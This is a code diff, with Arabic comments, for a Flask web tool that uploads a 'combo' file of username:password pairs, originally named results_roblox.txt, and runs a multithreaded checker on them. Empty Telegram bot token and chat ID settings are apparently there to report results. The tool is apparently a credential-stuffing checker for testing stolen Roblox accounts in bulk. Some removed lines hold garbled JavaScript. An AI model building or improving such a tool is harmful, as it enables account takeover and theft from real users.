@@ -1,6 +1,4 @@
 import os
-import re
-import json
 import time
 import threading
 from queue import Queue, Empty
@@ -14,12 +12,10 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = os.urandom(24).hex()
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
-# ==========================================
 # الإعدادات (تقدر تغيرها)
-# ==========================================
-BOT_TOKEN = ""  # حط توكن البوت هنا
-CHAT_ID = ""    # حط الايدي حقك هنا
-WORKERS = 20    # عدد الثريدات (خله 20 أو 30)
+BOT_TOKEN = ""  # حط التوكن هنا
+CHAT_ID = ""    # حط الايدي هنا
+WORKERS = 20    # عدد الثريدات
 
 STATE = {
     "running": False,
@@ -149,6 +145,7 @@ INDEX_HTML = r"""<!doctype html>
   .upload-box {
     border: 2px dashed var(--fg); padding: 40px 20px; text-align: center;
     border-radius: 8px; margin-bottom: 20px; cursor: pointer; transition: 0.3s;
+    display: block; width: 100%;
   }
   .upload-box:hover { background: rgba(57, 255, 20, 0.1); }
   .upload-box input[type="file"] { display: none; }
@@ -172,7 +169,7 @@ INDEX_HTML = r"""<!doctype html>
   
   <label class="upload-box" id="drop-zone">
     <input type="file" id="file-input" accept=".txt">
-    <span id="upload-text">📁 اضغط هنا أو اسحب ملف الكومبو (results_roblox.txt)</span>
+    <span id="upload-text">📁 اضغط هنا أو اسحب ملف الكومبو</span>
   </label>
 
   <div class="stats">
@@ -192,40 +189,41 @@ const fileInput = document.getElementById("file-input");
 const uploadText = document.getElementById("upload-text");
 
 function append(cls, text) {
-  const div = document(".createElement("div");
+  const div = document.createElement("div");
   div.className = cls;
-  div.textContent =bad text;
+  div.textContent = text;
   term.appendChild(div);
-  term.scroll",Top = term.scrollHeight;
+  term.scrollTop = term.scrollHeight;
 }
 
-fileInput.addEventListener("change "", async (e) => {
-  const file = e.target.files!![0];
+fileInput.addEventListener("change", async (e) => {
+  const file = e.target.files[0];
   if (!file) return;
   
-  uploadText.textContent = "⏳ جاري قراءة الملف...";
-  append("", `> تم اختيار الملف: ${file.name}`);
+  uploadText.textContent = "⏳ جاري رفع الملف للسيرفر...";
+  append("", `> تم اختيار الملف: ${file.name} (${Math.round(file.size / 1024)} KB)`);
   
-  const text = await file.text();
-  const lines = text.split("\n").map(l => l.trim()).filter(l => l.includes(":"));
+  // إرسال الملف كملف FormData للسيرفر عشان يقراه
+  const formData = new FormData();
+  formData.append("file", file);
   
-  if (lines.length === 0) {
-    append الملف فاضي أو ما فيه صيغة صحيحة (user:pass)");
-    uploadText.textContent = "📁 اضغط هنا أو اسحب ملف الكومبو (results_roblox.txt)";
-    return;
-  }
-
-  uploadText.textContent = "✅ تم التحميل! جاري بدء الفحص...";
-  
-  const r = await fetch("/api/start", { 
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({ combos: lines })
-  });
-  
-  const j = await r.json();
-  if (!j.ok) {
-    append("bad", "!! خطأ: " + j.error);
+  try {
+    const r = await fetch("/api/upload", { 
+      method: "POST",
+      body: formData
+    });
+    
+    const j = await r.json();
+    if (j.ok) {
+      uploadText.textContent = "✅ تم الرفع! جاري بدء الفحص...";
+      append("", `> السيرفر قرأ الملف بنجاح (${j.total} حساب).`);
+    } else {
+      append("bad", "!! خطأ: " + j.error);
+      uploadText.textContent = "❌ فشل الرفع، جرب مرة ثانية";
+    }
+  } catch (err) {
+    append("bad", "!! فشل الاتصال بالسيرفر");
+    uploadText.textContent = "❌ خطأ في الاتصال";
   }
 });
 
@@ -254,19 +252,32 @@ socket.on("stats", s => {
 def index():
     return render_template_string(INDEX_HTML)
 
-@app.route("/api/start", methods=["POST"])
-def api_start():
+@app.route("/api/upload", methods=["POST"])
+def api_upload():
     if STATE["running"]:
         return jsonify({"ok": False, "error": "الفحص شغال حالياً، انتظر يخلص"}), 400
         
-    data = request.get_json(force=True)
-    combos = data.get("combos", [])
-    
-    if not combos:
-        return jsonify({"ok": False, "error": "ما وصلت بيانات من الملف"}), 400
-
-    threading.Thread(target=run_checker, args=(combos,), daemon=True).start()
-    return jsonify({"ok": True})
+    if "file" not in request.files:
+        return jsonify({"ok": False, "error": "ما وصل ملف"}), 400
+        
+    file = request.files["file"]
+    if file.filename == "":
+        return jsonify({"ok": False, "error": "اسم الملف فاضي"}), 400
+        
+    try:
+        # قراءة الملف من السيرفر مباشرة
+        content = file.read().decode("utf-8", errors="ignore")
+        combos = [line.strip() for line in content.splitlines() if ":" in line]
+        
+        if not combos:
+            return jsonify({"ok": False, "error": "الملف فاضي أو مافيه صيغة صحيحة (user:pass)"}), 400
+            
+        # بدء الفحص في الخلفية
+        threading.Thread(target=run_checker, args=(combos,), daemon=True).start()
+        return jsonify({"ok": True, "total": len(combos)})
+        
+    except Exception as e:
+        return jsonify({"ok": False, "error": f"خطأ في قراءة الملف: {str(e)}"}), 500
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
